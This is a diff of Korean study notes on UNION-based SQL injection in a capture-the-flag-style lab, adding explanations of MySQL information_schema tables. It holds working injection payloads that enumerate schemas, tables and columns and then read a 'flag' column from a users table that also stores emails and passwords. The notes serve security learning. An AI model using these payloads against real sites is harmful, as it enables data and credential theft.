@@ -517,23 +517,60 @@ Union SQL Injection : 두 개의 SQL 문을 결합해서 만드는 SQL 공격
 <br>
 <br>
 
-1. 컬럼 수 확인 : 1, 2, 3, 4, #
+**1. 컬럼 수 확인 : 1, 2, 3, 4, #**
 
 ' UNION SELECT 1, 2, 3, 4 ; #
 
-2. DB 데이터베이스의 이름을 찾기 - DB 명: board
+**2. DB 데이터베이스의 이름을 찾기 - DB 명: board**
 
-' UNION SELECT 1, 2, schema_name, 4 from information_schema.schemata ; #
+' UNION SELECT 1, 2, schema_name, 4 FROM information_schema.schemata ; #
 
-3. Table 명 찾기 - Table 명 : users
+자리는 상관이 없음.
+
+왜 schema_name인가? => 그것이 실제 DB 이름을 담고 있는 정확한 컬럼명이기 때문
+
+왜 information_schema.schemata인가? => MySQL에서 DB 목록을 담고 있는 시스템 테이블이기 때문 (schemata는 "스키마들"이라는 뜻)
+
+**3. Table 명 찾기 - Table 명 : users**
 
 ' UNION SELECT 1, 2, table_name, 4 FROM information_schema.tables WHERE table_schema = 'board' ; # (WHERE 절 DB에 있는 TABLE 질의 검색)
 
-4. 속성 명 찾기 - 속성명 : id, email, password, flag
+왜 information_schema.tables인가?
+ 
+MySQL에서는 모든 데이터베이스의 테이블 목록을 이 시스템 테이블에 저장합니다.
+
+information_schema.tables는 표준 시스템 테이블
+
+```
+주요 컬럼:
+
+table_schema: 테이블이 속한 데이터베이스 이름
+table_name: 테이블 이름
+table_type: BASE TABLE, VIEW 등
+```
+
+**4. 속성 명 찾기 - 속성명 : id, email, password, flag**
 
 ' UNION SELECT 1, 2, column_name, 4 FROM information_schema.columns WHERE table_name = 'users' ; #
 
-5. SQL 문: SELECT column명 FROM Table명
+information_schema.columns란?
 
-') UNION SELECT 1, 2, flag, 4 FROM users ; #
+MySQL 시스템 테이블로, 모든 테이블의 컬럼 정보를 저장하고 있다.
 
+```
+주요 컬럼:
+table_schema: 어떤 DB 소속인지
+table_name: 어떤 테이블인지
+column_name: 컬럼 이름
+```
+WHERE 조건: table_name = 'users'
+
+이 조건으로 인해 "users"라는 이름을 가진 테이블의 컬럼들만 가져온 것.
+
+단, users라는 테이블 이름은 모든 데이터베이스에 걸쳐 조회되기 때문에,  만약 같은 이름의 테이블이 다른 DB에 또 있다면, 구분이 필요할 수도 있다.
+
+**5. SQL 문: SELECT column명 FROM Table명**
+
+' UNION SELECT 1, 2, flag, 4 FROM users ; #
+
+=> 결과가 화면에 바로 출력됨
